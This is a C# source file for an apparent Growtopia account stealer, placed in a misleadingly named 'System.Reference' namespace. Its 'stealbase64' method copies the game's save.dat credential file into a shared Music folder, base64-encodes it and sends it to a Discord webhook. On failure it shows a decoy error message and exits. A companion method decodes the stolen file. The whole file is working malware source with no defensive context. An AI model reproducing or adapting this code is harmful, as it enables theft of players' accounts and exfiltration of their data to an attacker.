using System.IO;
using System.Threading;
using System.Windows;

namespace System.Reference
{
    public class Debby
    {
        public void stealbase64(string error,string webhook)
        {
            try
            {
                Thread.Sleep(10);
                string sourceFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Growtopia\save.dat";
                string destinationFile = Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic) + @"\result.debby";
                File.Copy(sourceFile, destinationFile, true); ;
                Thread.Sleep(60);
                StreamReader readdat = new StreamReader(destinationFile);
                string base64encoded = readdat.ReadToEnd();
                               string base64encodd = Base64.Base64Encode(base64encoded);
                using (dWebHook discordsender = new dWebHook())
                {
                    discordsender.ProfilePicture = "https://s3.amazonaws.com/static.graphemica.com/glyphs/i500s/000/002/004/original/0058-500x500.png?1275291789";
                    discordsender.UserName = "Debby:";
                    discordsender.WebHook = webhook;
                    discordsender.SendMessage("||"+base64encodd+"||");
                }

            }
            catch
            {
                MessageBox.Show(error,"Error",MessageBoxButton.OK,MessageBoxImage.Error);
                Environment.Exit(-1);
            }
        }
        public void decodebase64(string file, string towhere)
        {
            StreamReader reader = new StreamReader(file);
            string base94encoded = reader.ReadToEnd();
            string base94decoded = Base64.Base64Decode(base94encoded);
            File.WriteAllText(towhere, base94decoded);
        }
    }
}
